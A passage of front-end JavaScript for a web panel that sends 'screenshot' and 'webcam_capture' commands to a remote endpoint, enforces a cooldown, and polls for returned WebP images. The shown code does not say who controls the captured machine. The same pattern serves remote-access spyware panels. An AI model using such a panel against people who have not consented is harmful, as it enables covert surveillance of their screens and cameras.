  async function fetchResponsesDebug() {
    const started = performance.now();
    const res = await fetch(RESP_ENDPOINT, {
      headers: { "Accept": "application/json" },
      credentials: "include"
    });

    const ct = res.headers.get("content-type") || "";
    let data = null;
    let bodyText = null;
    try {
      if (ct.includes("application/json")) data = await res.json();
      else bodyText = await res.text();
    } catch (e) {
      bodyText = bodyText || "(failed to parse response)";
    }

    const ms = Math.round(performance.now() - started);

    console.log("[resp poll] status", res.status, res.statusText, "ms", ms, "ct", ct);
    console.log("[resp poll] raw data", data ?? bodyText);

    if (!res.ok) {
      throw new Error("responses_http_" + res.status);
    }
    if (!data) {
      throw new Error("responses_not_json");
    }

    const items = Array.isArray(data.items) ? data.items : (Array.isArray(data.responses) ? data.responses : []);
    console.log("[resp poll] items len", items.length);

    if (items.length) {
      const sample = items[0];
      console.log("[resp poll] first item keys", sample ? Object.keys(sample) : null);
      const n0 = normalizeResponseItem(sample);
      console.log("[resp poll] first item normalized", {
        commandId: n0.commandId,
        createdAt: n0.createdAt,
        kind: n0.kind,
        mime: n0.mime,
        hasWebpB64: !!n0.webpB64,
        url: n0.url,
        detailsKeys: n0.details ? Object.keys(n0.details) : null
      });
    }

    return items;
  }

  function isWebpImageResponse(n, wantKind) {
    const k = (n.kind ? String(n.kind).toLowerCase() : "");
    const m = (n.mime ? String(n.mime).toLowerCase() : "");

    const kindOk = wantKind ? k.includes(String(wantKind).toLowerCase()) : false;

    return kindOk || m.includes("image/webp") || !!n.webpB64;
  }

  let pollTimer = null;

  function stopPoll() {
    if (pollTimer) {
      clearInterval(pollTimer);
      pollTimer = null;
    }
  }

  function startPoll({ intervalMs = 1000 } = {}) {
    stopPoll();
    pollTimer = setInterval(async () => {
      try {
        const items = await fetchResponsesDebug();

        if (!baselineSeen) {
          if (items.length) {
            const newest = normalizeResponseItem(items[0]);
            markSeen(newest);
          }
          baselineSeen = true;
          console.log("[resp poll] baseline set", { lastSeenId, lastSeenCreatedAt });
          return;
        }

        if (pendingScreenshot) {
          const now = Date.now();
          if (now > pendingScreenshot.timeoutAt) {
            addLine("Timed out waiting for screenshot response.", "error");
            console.warn("[resp poll] screenshot timeout", pendingScreenshot);
            pendingScreenshot = null;
            return;
          }

          const normalized = items.map(normalizeResponseItem);

          const candidates = normalized.filter(n => isWebpImageResponse(n, "screenshot"));

          console.log("[resp poll] screenshot candidates", candidates.map(c => ({
            commandId: c.commandId,
            createdAt: c.createdAt,
            kind: c.kind,
            mime: c.mime,
            hasWebpB64: !!c.webpB64,
            url: c.url
          })));

          let match = null;

          if (pendingScreenshot.commandIdGuess) {
            match = candidates.find(c => String(c.commandId) === String(pendingScreenshot.commandIdGuess)) || null;
          }
          if (!match) {
            match = candidates.find(c => isNewerThanBaseline(c)) || null;
          }

          if (match) {
            if (match.url) {
              const bust = String(match.url) + (String(match.url).includes("?") ? "&" : "?") + "t=" + encodeURIComponent(String(match.createdAt || Date.now()));
              addImagePreviewUrl(bust);
            } else {
              addLine("Found screenshot-like response but it had no webp_b64 or url.", "error");
              console.warn("[resp poll] match had no payload", match.raw);
            }

            markSeen(match);
            pendingScreenshot = null;
            return;
          }
        }

        if (pendingWebcam) {
          const now = Date.now();
          if (now > pendingWebcam.timeoutAt) {
            addLine("Timed out waiting for webcam capture response.", "error");
            console.warn("[resp poll] webcam timeout", pendingWebcam);
            pendingWebcam = null;
            return;
          }

          const normalized = items.map(normalizeResponseItem);

          const candidates = normalized.filter(n => isWebpImageResponse(n, "webcam"));

          console.log("[resp poll] webcam candidates", candidates.map(c => ({
            commandId: c.commandId,
            createdAt: c.createdAt,
            kind: c.kind,
            mime: c.mime,
            hasWebpB64: !!c.webpB64,
            url: c.url
          })));

          let match = null;

          if (pendingWebcam.commandIdGuess) {
            match = candidates.find(c => String(c.commandId) === String(pendingWebcam.commandIdGuess)) || null;
          }
          if (!match) {
            match = candidates.find(c => isNewerThanBaseline(c)) || null;
          }

          if (match) {
            if (match.url) {
              const bust =
                String(match.url) +
                (String(match.url).includes("?") ? "&" : "?") +
                "t=" +
                encodeURIComponent(String(match.createdAt || Date.now()));
              addImagePreviewUrl(bust);
            } else {
              addLine("Found webcam-like response but it had no webp_b64 or url.", "error");
              console.warn("[resp poll] webcam match had no payload", match.raw);
            }

            markSeen(match);
            pendingWebcam = null;
            return;
          }
        }

        const normalized = items.map(normalizeResponseItem);
        const newest = normalized[0];
        if (newest && isNewerThanBaseline(newest)) {
          addLine("New response arrived: kind=" + (newest.kind || "?") + " mime=" + (newest.mime || "?"), "info");
          console.log("[resp poll] rendering debug new item", newest);
          markSeen(newest);
        }
      } catch (e) {
        console.warn("[resp poll] error", e);
      }
    }, intervalMs);
  }

  startPoll({ intervalMs: 1000 });

  async function postForm(form) {
    const action = form.getAttribute("action");
    const cmd = form.dataset.cmd || "command";

    if (isCoolingDown()) {
      startCooldown();
      addLine("Please wait for cooldown.", "cooldown");
      return;
    }

    const params = new URLSearchParams(new FormData(form));
    const previewMode = getCommandPreviewRequestMode();
    if (previewMode) {
      params.set("preview_mode", previewMode);
    }
    clearFormFields(form);

    startCooldown();
    addLine("Sending " + cmd + "...", "send");

    console.log("[cmd] sending", { cmd, action, params: params.toString() });

    let res, bodyText;
    try {
      res = await fetch(action, {
        method: "POST",
        headers: {
          "Accept": "application/json",
          "X-Requested-With": "XMLHttpRequest",
          "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
        },
        body: params.toString(),
        credentials: "include"
      });
    } catch (e) {
      addLine("Network error: " + (e && e.message ? e.message : String(e)), "error");
      console.warn("[cmd] network error", e);
      return;
    }

    let data = null;
    const ct = (res.headers.get("content-type") || "");
    try {
      if (ct.includes("application/json")) data = await res.json();
      else bodyText = await res.text();
    } catch (e) {
      bodyText = bodyText || "(failed to parse response)";
    }

    console.log("[cmd] response", {
      cmd,
      status: res.status,
      statusText: res.statusText,
      contentType: ct,
      data,
      bodyText
    });

    if (res.status === 429 && data && (data.code === "WEB_COOLDOWN" || data.code === "COOLDOWN")) {
      const retryMs = Number(data.retry_after_ms || data.retryAfterMs || COOLDOWN_MS);
      nextAllowedAt = Date.now() + Math.max(500, retryMs);
      startCooldown();
      addLine("Cooldown: wait " + Math.ceil(retryMs / 1000) + "s", "cooldown");
      return;
    }

    if (!res.ok) {
      if (data && data.message) addLine(data.message, "error");
      else addLine("HTTP " + res.status + " " + res.statusText + " — " + (bodyText || ""), "error");
      return;
    }

    if (data) {
      addLine(data.message || ("OK (sent=" + (data.sent ?? "?") + ")"), "ok");
    } else {
      addLine(bodyText || "OK", "ok");
    }

    hideCmdModal();

    if (cmd === "screenshot") {
      const commandIdGuess = data?.commandId || data?.id || data?.command_id || null;

      pendingScreenshot = {
        startedAt: Date.now(),
        timeoutAt: Date.now() + 45000,
        commandIdGuess
      };

      addLine(
        "Waiting for screenshot response..." +
          (commandIdGuess ? (" (commandId=" + commandIdGuess + ")") : ""),
        "info"
      );

      console.log("[resp poll] pendingScreenshot set", pendingScreenshot);
    }

    if (cmd === "webcam_capture") {
      const commandIdGuess = data?.commandId || data?.id || data?.command_id || null;

      pendingWebcam = {
        startedAt: Date.now(),
        timeoutAt: Date.now() + 45000,
        commandIdGuess
      };

      addLine(
        "Waiting for webcam capture response..." +
          (commandIdGuess ? (" (commandId=" + commandIdGuess + ")") : ""),
        "info"
      );

      console.log("[resp poll] pendingWebcam set", pendingWebcam);
    }
  }

  async function postInstant(action, cmd) {
    if (!action) return;

    if (isCoolingDown()) {
      startCooldown();
      addLine("Please wait for cooldown.", "cooldown");
      return;
